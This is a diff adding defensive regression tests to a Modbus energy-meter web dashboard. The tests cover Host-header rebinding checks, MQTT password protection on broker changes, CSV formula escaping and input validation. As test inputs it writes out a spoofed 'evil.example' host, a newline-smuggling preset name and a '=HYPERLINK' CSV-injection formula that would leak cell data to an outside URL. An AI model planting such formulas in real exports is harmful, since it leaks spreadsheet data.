@@ -253,7 +253,7 @@ def test_modbus_errors_are_json(env):
 
 def test_partial_settings_update_and_types(env):
     ctx, c, _ = env
-    put(c, "/api/settings/mqtt", {"enabled": False, "host": "broker.lan", "port": 1885})
+    put(c, "/api/settings/mqtt", {"enabled": False, "host": "broker.lan", "port": 1885, "password": "nowe"})
     r = put(c, "/api/settings/mqtt", {"interval": 20})
     s = r.get_json()["settings"]
     assert (s["host"], s["port"], s["interval"]) == ("broker.lan", 1885, 20)
@@ -304,3 +304,147 @@ def test_history_toggle_without_restart(env):
     assert r.get_json()["active"] is False and ctx.history is None
     r = put(c, "/api/settings/history", {"enabled": True})
     assert r.get_json()["active"] is True and ctx.history is not None
+
+
+# ── regresje z przeglądu ──────────────────────────────────────
+def test_unknown_host_is_rejected_without_auth(env, tmp_path):
+    from modbus_dash.web import host_allowed
+    ctx, c, _ = env
+    for host in ("evil.example", "evil.example:5000"):
+        r = c.get("/api/config", headers={"Host": host})
+        assert r.status_code == 403 and "--allowed-host" in r.get_json()["error"]
+        r = c.put("/api/buses/rebound", data=json.dumps({"kind": "tcp", "host": "127.0.0.1"}),
+                  content_type="application/json", headers={"Host": host, "Origin": f"http://{host}"})
+        assert r.status_code == 403
+    assert c.get("/", headers={"Host": "evil.example"}).status_code == 403
+    for host in ("localhost:5000", "127.0.0.1", "[::1]:5000", "192.168.1.20:5000", "pi.localhost"):
+        assert c.get("/api/health", headers={"Host": host}).status_code == 200, host
+    import socket as _s
+    assert host_allowed(_s.gethostname()) and host_allowed(_s.gethostname().split(".")[0] + ".local:80")
+    assert host_allowed("energia.lan:5000", ["energia.lan"]) and host_allowed("pi.dom.lan", ["*.dom.lan"])
+    assert not host_allowed("dom.lan.evil.example", ["*.dom.lan"]) and host_allowed("x.y", ["*"])
+    # z hasłem rebinding nic nie da (przeglądarka nie ma danych logowania dla obcej domeny)
+    args = app_module.parse_args(["--data-dir", str(tmp_path), "--presets-dir", str(tmp_path / "p"), "--no-sim",
+                                  "--no-history", "--auth", "admin:tajne"])
+    actx = app_module.AppContext(args)
+    try:
+        import base64
+        tok = base64.b64encode(b"admin:tajne").decode()
+        r = create_app(actx).test_client().get("/api/info", headers={"Host": "nas.example",
+                                                                     "Authorization": f"Basic {tok}"})
+        assert r.status_code == 200
+    finally:
+        actx.shutdown()
+
+
+def test_allowed_host_option(tmp_path):
+    args = app_module.parse_args(["--data-dir", str(tmp_path), "--presets-dir", str(tmp_path / "p"), "--no-sim",
+                                  "--no-history", "--allowed-host", "energia.lan"])
+    actx = app_module.AppContext(args)
+    try:
+        c = create_app(actx).test_client()
+        assert c.get("/api/health", headers={"Host": "energia.lan:5000"}).status_code == 200
+        assert c.get("/api/health", headers={"Host": "inna.lan"}).status_code == 403
+    finally:
+        actx.shutdown()
+
+
+def test_mqtt_password_not_sent_to_new_broker(env):
+    ctx, c, _ = env
+    assert put(c, "/api/settings/mqtt", {"enabled": False, "host": "broker.lan", "port": 1883,
+                                         "username": "ha", "password": "S3cret"}).status_code == 200
+    for change in ({"host": "127.0.0.1"}, {"port": 7062}, {"username": "inny"}, {"tls": True}):
+        for pw in ({"password": "********"}, {}):
+            r = put(c, "/api/settings/mqtt", {**change, **pw})
+            assert r.status_code == 400 and r.get_json()["field"] == "password", (change, pw)
+    assert ctx.config.get()["mqtt"]["host"] == "broker.lan"
+    r = put(c, "/api/settings/mqtt", {"interval": 15, "password": "********"})
+    assert r.status_code == 200 and ctx.config.get()["mqtt"]["password"] == "S3cret"
+    r = put(c, "/api/settings/mqtt", {"host": "127.0.0.1", "password": "nowe"})
+    assert r.status_code == 200 and ctx.config.get()["mqtt"]["password"] == "nowe"
+
+
+def test_csv_header_is_formula_safe(env):
+    ctx, c, _ = env
+    raw = json.loads(c.get("/api/presets/simulator_3f?raw=1").get_data(as_text=True))
+    raw["name"] = "CSV formuły"
+    raw["registers"]["voltage_l1"]["label"] = '=HYPERLINK("http://x/?"&A2,"V")'
+    raw["registers"]["frequency"]["label"] = "@SUM(1+1)"
+    assert put(c, "/api/presets/csvtest", raw).status_code == 200
+    assert put(c, "/api/devices/csvdev", {"bus": "sim", "unit": 1, "preset": "csvtest",
+                                          "enabled": False}).status_code == 200
+    try:
+        assert post(c, "/api/devices/csvdev/read").status_code == 200
+        text = c.get("/api/devices/csvdev/history.csv?seconds=60").get_data(as_text=True)
+        header = text.lstrip("﻿").splitlines()[0]
+        assert "'=HYPERLINK" in header and "'@SUM(1+1) [Hz]" in header
+        assert ';"=' not in header and ";@" not in header
+    finally:
+        c.delete("/api/devices/csvdev")
+        c.delete("/api/presets/csvtest")
+
+
+def test_ping_bodies(env):
+    ctx, c, _ = env
+    for body in ("[]", "1", '"x"'):
+        r = c.post("/api/buses/sim/ping", data=body, content_type="application/json")
+        assert r.status_code == 400, body
+    assert c.post("/api/buses/sim/ping").status_code == 200  # brak treści = test łącza
+    r = c.post("/api/ping", data="[1]", content_type="application/json")
+    assert r.status_code == 400
+
+
+def test_scan_preset_skips_malformed_hints(env):
+    ctx, c, _ = env
+    good = {"address": 0, "raw": [17254, 0], "hint": {"guess": "voltage", "type": "float32",
+                                                       "byte_order": "ABCD", "score": 0.9, "value": 230}}
+    rows = [good]
+    for hint in ({"score": "x"}, {"guess": []}, {"guess": {}}, {"scale": float("nan")}, {"scale": float("inf")},
+                 {"alternatives": [{"guess": []}]}):
+        rows.append({**good, "address": 10 + len(rows) * 2, "hint": {**good["hint"], **hint}})
+    r = c.post("/api/scan/preset", data=json.dumps({"registers": rows}).replace("NaN", "NaN"),
+               content_type="application/json")
+    assert r.status_code == 200, r.get_data(as_text=True)
+    assert len(r.get_json()["registers"]) >= 1
+    assert post(c, "/api/scan/preset", {"registers": rows[:1], "byte_order": ["ABCD"]}).status_code == 400
+    assert post(c, "/api/scan/preset", {"registers": rows[:1], "alignment": "środek"}).status_code == 400
+
+
+def test_locked_bus_cannot_be_deleted(env):
+    ctx, c, _ = env
+    r = c.delete("/api/buses/sim")
+    assert r.status_code == 400 and "CLI" in r.get_json()["error"]
+    assert "sim" in ctx.config.get()["buses"]
+
+
+def test_device_enabled_must_be_boolean(env):
+    ctx, c, _ = env
+    for bad in ("false", 0, "tak"):
+        r = put(c, "/api/devices/flagdev", {"bus": "sim", "unit": 1, "enabled": bad})
+        assert r.status_code == 400 and "enabled" in r.get_json()["error"], bad
+    assert "flagdev" not in ctx.config.get()["devices"]
+
+
+def test_integer_settings_reject_fractions(env):
+    ctx, c, _ = env
+    r = put(c, "/api/settings/history", {"memory_points": 3600.5})
+    assert r.status_code == 400
+    r = put(c, "/api/settings/history", {"memory_points": 3600.0})
+    assert r.status_code == 200 and type(ctx.config.get()["history"]["memory_points"]) is int
+    assert put(c, "/api/settings/mqtt", {"interval": 2.5}).status_code == 400
+
+
+def test_preset_validation_edge_cases(env):
+    ctx, c, _ = env
+    base = {"name": "Brzegowy", "registers": {"voltage_l1": {"address": 0}}}
+    for extra in ({"probe": ["voltage_l1"]}, {"probe": {"a": 1}}):
+        r = post(c, "/api/presets/validate", {**base, **extra})
+        assert r.status_code == 200 and not r.get_json()["ok"]
+        assert post(c, "/api/presets", {**base, **extra}).status_code == 400
+    r = c.post("/api/presets", data='{"name": "NaN test", "registers": {"v": {"address": 0, "scale": NaN}}}',
+               content_type="application/json")
+    assert r.status_code == 400
+    assert put(c, "/api/presets/nl%0A", base).status_code in (400, 404)
+    r = post(c, "/api/presets", {**base, "name": "- SDM630 garaż"})
+    assert r.status_code == 201 and r.get_json()["id"] == "SDM630 garaż"
+    c.delete("/api/presets/" + "SDM630 garaż")
